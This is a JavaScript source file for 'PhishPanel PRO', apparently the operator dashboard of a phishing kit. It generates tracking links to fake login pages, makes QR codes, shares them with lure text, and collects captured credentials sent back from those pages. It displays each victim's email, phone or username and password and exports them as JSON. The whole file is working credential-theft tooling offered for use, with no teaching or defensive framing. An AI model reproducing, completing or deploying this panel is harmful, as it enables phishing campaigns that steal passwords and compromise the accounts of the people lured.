class PhishPanelPro {
    constructor() {
        this.logs = JSON.parse(localStorage.getItem('phishpanel_logs') || '[]');
        this.totalLinks = parseInt(localStorage.getItem('total_links') || '0');
        this.init();
    }

    init() {
        this.bindEvents();
        this.updateUI();
        this.listenForCaptures();
        console.log('🔥 PhishPanel PRO v2.0 Ready!');
    }

    bindEvents() {
        document.getElementById('generateBtn').onclick = () => this.generateLink();
        document.getElementById('copyLinkBtn').onclick = () => this.copyLink();
        document.getElementById('qrBtn').onclick = () => this.generateQR();
        document.getElementById('shareBtn').onclick = () => this.shareLink();
        document.getElementById('clearBtn').onclick = () => this.clearLogs();
        document.getElementById('exportBtn').onclick = () => this.exportLogs();
    }

    generateLink() {
        const page = document.getElementById('pageSelect').value;
        const id = this.generateId();
        const url = `${location.protocol}//${location.host}/pages/${page}.html?id=${id}`;
        
        document.getElementById('phishLink').value = url;
        document.getElementById('linkSection').classList.remove('hidden');
        
        this.totalLinks++;
        localStorage.setItem('total_links', this.totalLinks);
        this.updateUI();
        
        // Auto copy
        setTimeout(() => this.copyLink(), 500);
        this.notify('🚀 Link Generated Successfully!');
    }

    generateId() {
        return Math.random().toString(36).substr(2, 9);
    }

    copyLink() {
        const input = document.getElementById('phishLink');
        input.select();
        input.setSelectionRange(0, 99999);
        navigator.clipboard.writeText(input.value);
        this.notify('📋 Link Copied!');
    }

    generateQR() {
        const link = document.getElementById('phishLink').value;
        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(link)}`;
        
        const qrDiv = document.createElement('div');
        qrDiv.innerHTML = `
            <div style="
                position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
                background: rgba(0,0,0,0.95); backdrop-filter: blur(20px);
                padding: 40px; border-radius: 20px; z-index: 9999; text-align: center;
                max-width: 90vw; border: 1px solid rgba(255,255,255,0.2);
            ">
                <img src="${qrUrl}" style="max-width: 300px; border-radius: 15px;">
                <br><button onclick="this.parentElement.parentElement.remove()" 
                    style="margin-top: 20px; padding: 12px 24px; background: #4ecdc4; 
                    color: white; border: none; border-radius: 10px; cursor: pointer;
                    font-weight: bold;">Close</button>
            </div>
        `;
        document.body.appendChild(qrDiv);
        this.notify('📱 QR Code Generated!');
    }

    shareLink() {
        const link = document.getElementById('phishLink').value;
        if (navigator.share) {
            navigator.share({ title: 'Check this out!', url: link });
        } else {
            this.copyLink();
        }
    }

    listenForCaptures() {
        window.addEventListener('message', (e) => {
            if (e.data && e.data.type === 'PHISH_CAPTURE') {
                const capture = {
                    id: Date.now(),
                    page: e.data.page,
                    data: e.data.creds,
                    timestamp: new Date().toLocaleString(),
                    ip: e.data.creds.ip || 'Unknown',
                    userAgent: navigator.userAgent.slice(0, 50)
                };
                
                this.logs.unshift(capture);
                localStorage.setItem('phishpanel_logs', JSON.stringify(this.logs.slice(0, 1000))); // Limit 1000
                this.renderLogs();
                this.updateUI();
                this.notify(`🎣 NEW CAPTURE: ${e.data.page.toUpperCase()}`);
            }
        });
    }

    renderLogs() {
        const container = document.getElementById('logsContainer');
        if (this.logs.length === 0) {
            container.innerHTML = '<div class="no-logs">🎣 No captures yet... Share links!</div>';
            return;
        }
        
        container.innerHTML = this.logs.map(log => `
            <div class="log-item">
                <div class="log-header">
                    <span>🎯 ${log.page.toUpperCase()}</span>
                    <span>${log.timestamp} | ${log.ip}</span>
                </div>
                <div class="log-creds">
                    <strong>Email/Phone:</strong> ${log.data.email || log.data.username || log.data.phone || 'N/A'}<br>
                    <strong>🔑 Password:</strong> ${log.data.password || 'N/A'}
                </div>
            </div>
        `).join('');
    }

    updateUI() {
        document.getElementById('totalLinks').textContent = this.totalLinks;
        document.getElementById('totalCaptures').textContent = this.logs.length;
        document.getElementById('activePages').textContent = 4;
        this.renderLogs();
    }

    clearLogs() {
        this.logs = [];
        localStorage.removeItem('phishpanel_logs');
        this.updateUI();
        this.notify('🗑️ All logs cleared!');
    }

    exportLogs() {
        const data = JSON.stringify(this.logs, null, 2);
        const blob = new Blob([data], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `phishpanel_captures_${new Date().toISOString().split('T')[0]}.json`;
        a.click();
        this.notify('💾 Logs exported!');
    }

    notify(message) {
        const notif = document.createElement('div');
        notif.textContent = message;
        notif.style.cssText = `
            position: fixed; top: 30px; right: 30px;
            background: linear-gradient(45deg, #4ecdc4, #44bd99);
            color: white; padding: 20px 30px; border-radius: 15px;
            font-weight: bold; z-index: 10000;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            transform: translateX(400px); transition: all 0.4s;
        `;
        document.body.appendChild(notif);
        
        setTimeout(() => notif.style.transform = 'translateX(0)', 100);
        setTimeout(() => {
            notif.style.transform = 'translateX(400px)';
            setTimeout(() => notif.remove(), 400);
        }, 3000);
    }
}

// 🔥 START PANEL
new PhishPanelPro();